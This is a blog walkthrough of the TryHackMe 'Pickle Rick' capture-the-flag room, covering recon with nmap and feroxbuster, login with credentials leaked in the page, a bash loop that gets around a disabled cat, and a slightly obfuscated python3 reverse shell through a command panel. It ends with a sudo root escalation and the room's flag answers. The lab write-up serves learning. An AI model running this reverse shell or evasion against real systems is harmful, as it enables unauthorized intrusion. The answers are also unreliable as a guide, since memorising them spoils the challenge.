@@ -1,0 +1,374 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="jb ">
+<meta name="description" content="Simple Walkthrough for a TryHackMe Room" />
+<meta name="keywords" content=", linux, pentest, nmap, feroxbuster, scanning, bash, python" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="https://jb-williams.github.io/jbtech.github.io/posts/2023/04/thm_picklerick_walkthrough/" />
+
+
+    <title>
+        
+            THM_PickleRick_Walkthrough :: jb 
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="https://jb-williams.github.io/jbtech.github.io/main.4e5c639214707eff609bb55fe49e183dee42258a73bc90e4cc7b0a84f900798a.css">
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://jb-williams.github.io/jbtech.github.io/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://jb-williams.github.io/jbtech.github.io/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://jb-williams.github.io/jbtech.github.io/favicon-16x16.png">
+    <link rel="manifest" href="https://jb-williams.github.io/jbtech.github.io/site.webmanifest">
+    <link rel="mask-icon" href="https://jb-williams.github.io/jbtech.github.io/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="https://jb-williams.github.io/jbtech.github.io/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+<meta itemprop="name" content="THM_PickleRick_Walkthrough">
+<meta itemprop="description" content="Simple Walkthrough for a TryHackMe Room"><meta itemprop="datePublished" content="2023-04-13T10:04:47-05:00" />
+<meta itemprop="dateModified" content="2023-04-13T10:04:47-05:00" />
+<meta itemprop="wordCount" content="586"><meta itemprop="image" content="https://jb-williams.github.io/jbtech.github.io/"/>
+<meta itemprop="keywords" content="linux,pentest,nmap,feroxbuster,scanning,bash,python," />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://jb-williams.github.io/jbtech.github.io/"/>
+
+<meta name="twitter:title" content="THM_PickleRick_Walkthrough"/>
+<meta name="twitter:description" content="Simple Walkthrough for a TryHackMe Room"/>
+
+
+
+    <meta property="og:title" content="THM_PickleRick_Walkthrough" />
+<meta property="og:description" content="Simple Walkthrough for a TryHackMe Room" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://jb-williams.github.io/jbtech.github.io/posts/2023/04/thm_picklerick_walkthrough/" /><meta property="og:image" content="https://jb-williams.github.io/jbtech.github.io/"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-04-13T10:04:47-05:00" />
+<meta property="article:modified_time" content="2023-04-13T10:04:47-05:00" />
+
+
+
+
+
+
+    <meta property="article:published_time" content="2023-04-13 10:04:47 -0500 CDT" />
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="https://jb-williams.github.io/jbtech.github.io/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">&gt;</span>
+            <span class="logo__text">jb</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="https://jb-williams.github.io/jbtech.github.io/about/">about</a></li><li><a href="https://jb-williams.github.io/jbtech.github.io/posts/">posts</a></li><li><a href="https://jb-williams.github.io/jbtech.github.io/tags/">tags</a></li><li><a href="https://jb-williams.github.io/jbtech.github.io/contact/">contact</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+ </svg></span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+  <main class="post">
+
+    <div class="post-info">
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock">
+          <circle cx="12" cy="12" r="10"></circle>
+          <polyline points="12 6 12 12 16 14"></polyline>
+        </svg>
+        3 minutes
+
+        
+      </p>
+    </div>
+
+    <article>
+      <h1 class="post-title">
+        <a href="https://jb-williams.github.io/jbtech.github.io/posts/2023/04/thm_picklerick_walkthrough/">THM_PickleRick_Walkthrough</a>
+      </h1>
+
+      
+        <div class="post-excerpt">Simple Walkthrough for a TryHackMe Room</div>
+      
+
+      
+
+      
+
+      <div class="post-content">
+        <h1 id="pickle-rick-tryhackme">Pickle Rick TryHackMe</h1>
+<h4 id="performed-by-jb-williams">performed by: jb-williams</h4>
+<h1 id="heading"></h1>
+<h2 id="pickle-rick">Pickle Rick</h2>
+<p>To access the box add the machines IP to this <code>https://&lt;IP&gt;.p.thmlabs.com</code></p>
+<ul>
+<li>Traveling to the sight we can start gathering information</li>
+<li>First it is always good to <code>View Page Source</code> to see if there are any information disclosers accidently left in the html source code.</li>
+<li>Doing so, you can see that a comment left in the source code is reminding Rick that the user name for their account is <code>R1ckRul3s</code></li>
+</ul>
+<h1 id="heading-1"></h1>
+<ul>
+<li>Now we scan the box with nmap to see what info we can gather.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -v -sC -sV -oN nmap/initial &lt;IP&gt;
+</span></span></code></pre></div><ul>
+<li>Found that OpenSSH 7.2p2 on port <code>22</code></li>
+<li>Found that Apache httpd 2.4.18 on port <code>80</code></li>
+</ul>
+<h1 id="heading-2"></h1>
+<ul>
+<li>While nmap was running I went to the site and just to check and see if there is anything interesting in the <code>robots.txt</code> file.</li>
+<li>There was a single &lsquo;word&rsquo; in that file: <code>Wubbalubbadubdub</code></li>
+</ul>
+<h1 id="heading-3"></h1>
+<ul>
+<li>I like to use <code>feroxbuster</code> instead of <code>gobuster</code>, just preference. So I ran my normal <code>feroxbuster</code> cmd, which also routes it through my web-proxy <code>zaproxy</code>(similar to burp) so I can capture and reuse any requests.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>feroxbuster -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -o ferox-initial.txt -x php,php5,htm,html,html5,js,txt -t <span style="color:#ae81ff">15</span> -L <span style="color:#ae81ff">15</span> -s 200,302,304 -P http://localhost:8080 -e -u http://10.10.24.209/
+</span></span></code></pre></div><ul>
+<li>Found a hidden <code>/login.php</code> route an began fuzzing Rick&rsquo;s login with username <code>R1ckRul3s</code></li>
+<li>After some time of fuzzing the password with <code>zaproxy</code> and poking around some, I got back to the <code>/robots.txt</code> and was reminded about <code>Wubbalubbadubdub</code>.</li>
+<li>I was able to login to Rick&rsquo;s account with username: <code>R1ckRul3s</code> password: <code>Wubbalubbadubdub</code></li>
+</ul>
+<h1 id="heading-4"></h1>
+<ul>
+<li>Logging in brought me to <code>/portal.php</code> with the first page being a <code>Command Panel</code>.</li>
+<li>Immediately attempted to run <code>ls</code> and say that it did list out directory contents:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Sup3rS3cretPickl3Ingred.txt
+</span></span><span style="display:flex;"><span>assets
+</span></span><span style="display:flex;"><span>clue.txt
+</span></span><span style="display:flex;"><span>denied.php
+</span></span><span style="display:flex;"><span>index.html
+</span></span><span style="display:flex;"><span>login.php
+</span></span><span style="display:flex;"><span>portal.php
+</span></span><span style="display:flex;"><span>robots.txt
+</span></span></code></pre></div><ul>
+<li>Trying to <code>cat</code> out any file responds with that command being disabled.</li>
+<li>A go to for me, seems a little long, but usually works for me is this bash syntax:
+<em>use absolute path if necessary, default would be files in current working directory</em></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#66d9ef">while</span> read line; <span style="color:#66d9ef">do</span> echo $line; <span style="color:#66d9ef">done</span> &lt; $FILE
+</span></span><span style="display:flex;"><span>ex:
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> read line; <span style="color:#66d9ef">do</span> echo $line; <span style="color:#66d9ef">done</span> &lt; Sup3rS3cretPickl3Ingred.txt
+</span></span></code></pre></div><ul>
+<li>Did that with both <code>Sup3rS3cretPickl3Ingred.txt</code>(our answer for question one) and <code>clue.txt</code>(clue to next ingredient)</li>
+</ul>
+<h1 id="heading-5"></h1>
+<ul>
+<li>Tried some different commands and found that this <em>slightly</em> obfuscated python3 reverse shell was able to work. To get the shell I ran:
+<em>local machine</em></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -lnvp <span style="color:#ae81ff">4444</span>
+</span></span></code></pre></div><p><em>in the command panel I pasted this(make sure you change you your ip and port)</em></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>p<span style="color:#ae81ff">\y</span>thon3 -c <span style="color:#e6db74">&#39;import os,pty,socket;s=socket.socket();s.connect((&#34;&lt;IP&gt;&#34;,4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(&#34;bash&#34;)&#39;</span>
+</span></span></code></pre></div><h1 id="heading-6"></h1>
+<ul>
+<li>Once I had a shell on the machine I ran <code>ls /home</code> to see any users&rsquo; home directories.</li>
+<li>Noticed Rick&rsquo;s so I ran <code>ls -la /home/rick</code> and saw <code>second ingredients</code>.</li>
+<li>Seeing the output that way let me know that it was a file with a space in the name so to cat it out I ran:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat /home/rick/second<span style="color:#ae81ff">\ </span>ingredients
+</span></span></code></pre></div><ul>
+<li>And that got us the answer to the second question.</li>
+</ul>
+<h1 id="heading-7"></h1>
+<ul>
+<li>Gathering more information about the system I happened to run <code>sudo -l</code> and saw that user <code>www-data</code>(which was the user I was on as) could run any sudo command withought a password, so I ran:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo su
+</span></span></code></pre></div><ul>
+<li>And was given <code>root</code> access.</li>
+</ul>
+<h1 id="heading-8"></h1>
+<ul>
+<li>I traversed over to the <code>/root</code> dir and listed it&rsquo;s contents and saw <code>3rd.txt</code></li>
+<li>After using <code>cat</code> to display <code>3rd.txt</code> we got the answer for the last question.</li>
+</ul>
+<h1 id="heading-9"></h1>
+<h3 id="what-is-the-first-ingredient-rick-needs"><em>What is the first ingredient Rick needs?</em></h3>
+<ul>
+<li><strong>Answer</strong>: <code>mr. meeseek hair</code></li>
+</ul>
+<h1 id="heading-10"></h1>
+<h3 id="whats-the-second-ingredient-rick-needs"><em>Whats the second ingredient Rick needs?</em></h3>
+<ul>
+<li><strong>Answer</strong>: <code>1 jerry tear</code></li>
+</ul>
+<h1 id="heading-11"></h1>
+<h3 id="whats-the-final-ingredient-rick-needs"><em>Whats the final ingredient Rick needs?</em></h3>
+<ul>
+<li><strong>Answer</strong>: <code>fleep juice</code></li>
+</ul>
+<h1 id="heading-12"></h1>
+<h1 id="heading-13"></h1>
+<p><em>written and performed by jb-williams</em> - <a href="https://github.com/jb-williams/">github</a></p>
+
+      </div>
+    </article>
+
+    <hr />
+
+    <div class="post-info">
+      
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
+
+        <span class="tag"><a href="https://jb-williams.github.io/jbtech.github.io/tags/linux/">linux</a></span>
+        <span class="tag"><a href="https://jb-williams.github.io/jbtech.github.io/tags/pentest/">pentest</a></span>
+        <span class="tag"><a href="https://jb-williams.github.io/jbtech.github.io/tags/nmap/">nmap</a></span>
+        <span class="tag"><a href="https://jb-williams.github.io/jbtech.github.io/tags/feroxbuster/">feroxbuster</a></span>
+        <span class="tag"><a href="https://jb-williams.github.io/jbtech.github.io/tags/scanning/">scanning</a></span>
+        <span class="tag"><a href="https://jb-williams.github.io/jbtech.github.io/tags/bash/">bash</a></span>
+        <span class="tag"><a href="https://jb-williams.github.io/jbtech.github.io/tags/python/">python</a></span>
+        
+    </p>
+
+      
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text">
+          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+          <polyline points="14 2 14 8 20 8"></polyline>
+          <line x1="16" y1="13" x2="8" y2="13"></line>
+          <line x1="16" y1="17" x2="8" y2="17"></line>
+          <polyline points="10 9 9 9 8 9"></polyline>
+        </svg>
+        586 Words
+      </p>
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
+          <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+          <line x1="16" y1="2" x2="16" y2="6"></line>
+          <line x1="8" y1="2" x2="8" y2="6"></line>
+          <line x1="3" y1="10" x2="21" y2="10"></line>
+        </svg>
+        
+          2023-04-13 10:04
+        
+
+         
+          
+        
+      </p>
+    </div>
+
+    
+    <div class="pagination">
+        
+
+        <div class="pagination__buttons">
+            
+
+            
+            <span class="button next">
+                <a href="https://jb-williams.github.io/jbtech.github.io/posts/2023/04/thm_kenobi_walkthrough/">
+                    <span class="button__text">THM_Kenobi_Walkthrough</span>
+                    <span class="button__icon">→</span>
+                </a>
+            </span>
+            
+        </div>
+    </div>
+
+
+    
+
+    
+
+  </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2023</span>
+            <span><a href="https://jb-williams.github.io/jbtech.github.io/">jb</a></span>
+            <span><a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></span>
+            <span><a href="https://jb-williams.github.io/jbtech.github.io/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
+            
+        </div>
+    </div>
+    
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>Powered by <a href="http://gohugo.io">Hugo</a></span><span>Made with &#10084; by <a href="https://github.com/rhazdon">Djordje Atlialp</a></span>
+        </div>
+    </div>
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="https://jb-williams.github.io/jbtech.github.io/bundle.min.bb2c6bc3ed452ca4759660e4020811f248bc2320081559e8a32d8b0092773852941133639d35e8370d03d3ddaa750b1edd6b343c5bd22a55d5bdeae8f648f49b.js" integrity="sha512-uyxrw&#43;1FLKR1lmDkAggR8ki8IyAIFVnooy2LAJJ3OFKUETNjnTXoNw0D092qdQse3Ws0PFvSKlXVvero9kj0mw=="></script>
+
+
+
+    </body>
+</html>
